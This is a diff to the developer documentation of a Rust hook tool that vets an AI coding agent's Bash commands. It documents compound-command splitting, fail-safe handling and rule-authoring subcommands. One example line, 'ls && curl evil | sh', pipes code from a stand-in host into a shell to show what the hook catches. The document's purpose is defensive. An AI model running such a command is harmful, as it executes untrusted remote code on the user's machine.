@@ -60,6 +60,17 @@ cargo run -- hooks exec
 # Report recorded PreToolUse hook results as JSON (filter by --start-time/--end-time, --tool, --result;
 # --dir defaults to ~/.local/state/moriarty/hooks)
 cargo run -- hooks report --tool Bash --result deny
+
+# Inspect, validate, and author bash/tool rules
+cargo run -- rules lint --strict          # report rules the hook silently ignores; warn on shadow/over-broad
+cargo run -- rules list-fragments         # show built-in + user pattern fragments
+cargo run -- rules schema                 # print a canonical example tool_rules.toml
+cargo run -- rules starter                # paste-ready allow-rules for common read-only commands
+cargo run -- rules suggest --result ask   # propose anchored rules from frequently-prompted commands (hook logs)
+cargo run -- rules replay --result allow  # check a candidate config keeps every prior auto-approval
+
+# Preview how the hook splits and decides a (compound) Bash command
+cargo run -- test bash-rules --explain --cwd <dir> '<command>'
 ```
 
 **Testing:**
@@ -205,6 +216,24 @@ test in a separate process, making this safe and preventing tests from clobberin
     cannot escape above that ancestor.
   - `bash_rules`: Bash-specific command validation with regex patterns. Actions: Allow, Deny, Modify, Ask,
     ArgumentFilter. Checked when no tool_rule matches a Bash call.
+  - **Compound splitting** (`hooks/command_split.rs`): the hook parses each Bash command with `brush-parser` (a
+    pure-Rust, `unsafe`-free shell parser) and evaluates every leaf simple-command independently via
+    `apply_rules_compound`, then merges the per-leaf decisions. This means a simple `^ls` allow-rule matches the `ls`
+    leaf of `ls | wc -l` or `a && ls`, and a dangerous tail can no longer hide behind a safe head (`ls && curl evil | sh`
+    ⇒ Ask, never Allow). Merge precedence: any leaf `Denied` ⇒ Deny; else any `Asked`/`NoMatch` (or a multi-leaf
+    `Modified`/`ArgumentFiltered`, which are not stitched back together) ⇒ prompt; only an all-`Allowed` command ⇒ Allow.
+    A single-leaf command returns its decision verbatim, preserving the `ArgumentFilter` re-validation loop.
+  - **`real_file_write` cap**: a leaf with a `>`/`>>`/`>|`/`&>` redirect to a real file (not `/dev/null`, not an fd
+    duplication like `2>&1`) has any `Allow` capped at Ask, so a read-only allow-rule (`^echo`) can't green-light
+    `echo secret > file`.
+  - **Bail ⇒ fail safe**: a command containing command substitution `$(...)`, backticks, a value-carrying parameter
+    expansion (`${x:-$(…)}`), a subshell, process substitution, a here-doc/here-string, a compound construct
+    (`if`/`for`/`while`/`case`/`[[ ]]`/`((…))`/brace group/function), or that fails to parse is un-analyzable: only an
+    explicit Deny matching the whole command is honored; every other outcome becomes a prompt.
+  - **Bash cwd stripping**: like the tool-rules field stripping, a leaf's in-cwd absolute paths are normalized to their
+    relative remainder before matching (no `..`-escaping remainder is rewritten), so `^cat src/` matches
+    `cat /abs/cwd/src/x`. `apply_rules(command)` stays the single-command primitive; `apply_rules_compound(command, cwd)`
+    is what the hook calls.
   - Evaluation order: tool_rules → bash_rules (for Bash) → passthrough (for non-Bash, defers to Claude Code)
 - **Stop hook**: Runs project checks before allowing execution
 - Structured logging with tracing crate for debugging hook execution. The "PreToolUse hook completed" log event
@@ -213,7 +242,21 @@ test in a separate process, making this safe and preventing tests from clobberin
 - **`hooks report` subcommand**: `hooks/report.rs` reads the JSON-lines hook logs, keeps completed PreToolUse records
   that carry the clean `result` field (legacy lines lacking it are skipped), and aggregates them by the exact
   `(tool name, arguments, result)` triple into a JSON report with counts. Reuses `cost_report::TimeRangeFilter` for
-  `--start-time`/`--end-time` and supports `--tool` and `--result` filters
+  `--start-time`/`--end-time` and supports `--tool` and `--result` filters. `report::aggregate` (the shared
+  read+aggregate helper) and `ReportRow` are `pub(crate)` so `rules suggest`/`rules replay` reuse them. The completion
+  log now also records `cwd`; `report.rs` does not parse it back yet, so today's `rules replay` normalizes recorded
+  commands with an empty cwd — capturing `cwd` lets a future replay enhancement normalize them exactly.
+- **Compile diagnostics & `rules` authoring tooling**: `BashRuleEngine::compile_with_diagnostics` and
+  `ToolRuleEngine::compile_with_diagnostics` return the engine plus a `RuleDiagnostic` for every dropped rule
+  (undefined/circular/over-depth fragment, invalid regex, or — tool rules only — a `field`/`pattern` given without its
+  partner); `from_config` delegates to them and logs each, preserving the fail-open-per-rule hot path. The `crate::rules`
+  command group surfaces them and helps author safe rules: `lint` (errors when a rule the user wrote is silently
+  dropped; `--strict` additionally warns on likely-shadowed and over-broad Allow rules), `list-fragments`, `schema`
+  (round-tripped against `UserConfig` in tests), `starter` (paste-ready read-only allow-rules that auto-allow the
+  north-star command), `suggest` (anchored exact/prefix rules mined from hook logs; never emits Allow unless
+  `--match exact`), and `replay` (re-evaluate recorded Bash decisions against a candidate config — the migration
+  acceptance gate is zero lost auto-approvals). `test bash-rules --explain [--cwd <dir>]` prints the per-leaf split,
+  normalized text, matching rule (with the expanded pattern), and merged decision via `BashRuleEngine::explain`.
 - Security model: Defaults to "Ask" when unconfigured, fail-closed once configured (verification failures block
   execution)
 
